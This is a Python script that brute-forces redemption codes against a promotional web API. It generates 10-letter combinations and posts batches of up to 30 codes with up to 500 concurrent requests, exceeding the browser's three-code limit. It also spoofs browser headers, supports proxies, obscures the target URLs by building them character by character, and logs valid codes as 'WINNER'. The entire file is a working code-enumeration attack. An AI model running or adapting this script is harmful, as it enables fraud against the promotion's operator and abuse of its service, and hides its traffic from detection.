#! /usr/bin/env python
# -*- coding: utf-8 -*-

import time
import math
from string import ascii_uppercase
from collections import deque, Counter
from itertools import product

import asyncio
import aiohttp
import aiofiles

# todo path
SOURCE_PARSED_INVALID = 'data/parsed.txt'
SOURCE_PARSED_VALID = 'data/valid.txt'
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
             'Chrome/61.0.3163.100 Safari/537.36'
REFERER = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'p', 'e', 'a', 'k', 'e', 'r', '.', 'p', 'r', 'i', 'n',
                   'g', 'l', 'e', 's', '.', 'c', 'o', 'm', '/', 'r', 'u', '_', 'R', 'U', '/', 'H', 'o', 'm', 'e'])
URL = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'p', 'e', 'a', 'k', 'e', 'r', '.', 'p', 'r', 'i', 'n', 'g',
               'l', 'e', 's', '.', 'c', 'o', 'm', '/', 'a', 'p', 'i', '/', 'r', 'u', '_', 'R', 'U', '/', 'r', 'e', 'd',
               'e', 'm', 'p', 't', 'i', 'o', 'n', '/', 'v', 'a', 'l', 'i', 'd', 'a', 't', 'e', '-', 'c', 'o', 'd', 'e',
               's'])   # mooore security =))
VALID_RESPONSE = 'Valid'
INVALID_RESPONSE = 'Invalid'
USED_RESPONSE = ''.join(['R', 'e', 'd', 'e', 'e', 'm', 'e', 'd'])


CODE_PREFIX = ''
CODE_CHARS = ascii_uppercase
CODE_LEN = 10

CODES_PER_SESSION_LIMIT = 30000   # limit per one parsing session
PROXY = None
MAX_SIMULTANEOUSLY_REQUEST = 500  # limit per onetime
CODES_BUFFER_LIMIT = 1000
CODES_PER_TASK_MIN = 3   # three is limitation in browser,
CODES_PER_TASK_MAX = 30  # but we can more
MAX_CLIENTS = int(MAX_SIMULTANEOUSLY_REQUEST / CODES_PER_TASK_MAX)

DEBUG = False

try:
    from config_local import *
except ImportError:
    pass


assert CODES_PER_TASK_MAX >= CODES_PER_TASK_MIN

# todo compare speed bulk vs minimal validation request


class Storage(object):

    invalid_file = None
    invalid_asyncfile = None
    valid_file = None
    valid_asyncfile = None

    codes_queue = deque()

    codes_buffer_valid = []
    codes_buffer_invalid = []
    stats = Counter(valid=0, invalid=0)

    @classmethod
    async def create(cls):
        instance = cls()
        await instance.init_fs()
        instance.generate_codes()
        return instance

    def generate_codes(self):
        combination_len = CODE_LEN - len(CODE_PREFIX)
        log('Generate code by len %s' % combination_len)
        for comination in product(CODE_CHARS, repeat=combination_len):
            code = '%s%s' % (CODE_PREFIX, ''.join(comination))
            if not self.is_already_parsed_code(code):
                self.codes_queue.append(code)

            if len(self.codes_queue) >= CODES_PER_SESSION_LIMIT:
                break

        log('Gen %d codes' % len(self.codes_queue))

    async def init_fs(self):
        # use mmap if need more speed
        self.invalid_asyncfile = await aiofiles.open(SOURCE_PARSED_INVALID, 'a+')
        self.invalid_file = open(SOURCE_PARSED_INVALID, 'r')
        self.valid_asyncfile = await aiofiles.open(SOURCE_PARSED_VALID, 'a+')
        self.valid_file = open(SOURCE_PARSED_VALID, 'r')

    def is_already_parsed_code(self, code):
        self.invalid_file.seek(0)
        self.valid_file.seek(0)
        return self._prepare_code_for_save(code) in self.valid_file.read() or self._prepare_code_for_save(code) in self.invalid_file.read()

    @staticmethod
    def _prepare_code_for_save(code):
        return '%s|' % code.upper()

    def get_code_for_check(self):
        return self.codes_queue.pop()

    async def save_parsed_code(self, code: str, valid: bool):
        if valid:
            self.codes_buffer_valid.append(code)
        else:
            self.codes_buffer_invalid.append(code)

        if len(self.codes_buffer_valid) + len(self.codes_buffer_invalid) > CODES_BUFFER_LIMIT:
            await self.flush_buffers()

    async def flush_buffers(self):
        # fixme dirty code
        if self.codes_buffer_valid:
            log('flush buffer valid', True)
            await self.valid_asyncfile.write(
                ''.join([self._prepare_code_for_save(code) for code in self.codes_buffer_valid]))
            self.stats['valid'] += len(self.codes_buffer_valid)
            self.codes_buffer_valid = []

        if self.codes_buffer_invalid:
            log('flush buffer invalid', True)
            await self.invalid_asyncfile.write(
                ''.join([self._prepare_code_for_save(code) for code in self.codes_buffer_invalid]))
            self.stats['invalid'] += len(self.codes_buffer_invalid)
            self.codes_buffer_invalid = []


def log(msg, force=False):
    # todo use logging
    if DEBUG or force:
        print(msg)

async def parsing(session, codes, pid, storage):
    start = time.time()
    async with session.post(URL, data={'codes': codes}, headers={'User-Agent': USER_AGENT, 'Referer': REFERER},
                            proxy=PROXY) as resp:
        response_json = await resp.json()
        log('Process {}: {} {}, took: {:.2f} seconds'.format(
            pid, codes, response_json, time.time() - start))

        for i, r in enumerate(response_json['result']):
            if not codes[i]:
                continue

            is_valid = r['status'] == VALID_RESPONSE
            log('save code %s %s' % (codes[i], int(is_valid)))
            await storage.save_parsed_code(codes[i], is_valid)

            if is_valid:
                log('WINNER %s' % codes[i], True)

            if r['status'] not in {VALID_RESPONSE, INVALID_RESPONSE, USED_RESPONSE}:
                log('UNKNOWN STATUS %s' % r['status'], True)


async def task(pid, storage: Storage, sem: asyncio.Semaphore):
    async with sem:
        log('Task {} started'.format(pid))
        codes = []
        for i in range(CODES_PER_TASK_MAX):
            try:
                codes.append(storage.get_code_for_check())
            except IndexError:
                pass

        if len(codes) < CODES_PER_TASK_MIN:
            log('skip task by not found codes %s' % codes, True)
            return

        async with aiohttp.ClientSession() as session:
            try:
                await parsing(session, codes, pid, storage)
            except aiohttp.client_exceptions.ClientError as e:
                log('Exception %s' % e, True)

async def run():
    storage = await Storage.create()
    sem = asyncio.Semaphore(MAX_CLIENTS)
    task_count = math.ceil(len(storage.codes_queue) / CODES_PER_TASK_MAX)
    log('Create %d tasks' % task_count, True)
    if not task_count:
        return

    start_time = time.time()
    # noinspection PyTypeChecker
    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(task_count)]
    await asyncio.wait(tasks)
    await storage.flush_buffers()
    end_time_in_sec = time.time() - start_time

    log("Process took: %.2f seconds (%.2f req/sec)" % (end_time_in_sec,
                                                       sum(storage.stats.values()) / end_time_in_sec), True)
    log('Result: invalid codes %d; valid codes %d' % (storage.stats['invalid'], storage.stats['valid']), True)


if __name__ == '__main__':
    log('Start %s clients per %s codes max:' % (MAX_CLIENTS, CODES_PER_TASK_MAX), True)
    ioloop = asyncio.get_event_loop()
    ioloop.run_until_complete(run())
    ioloop.close()
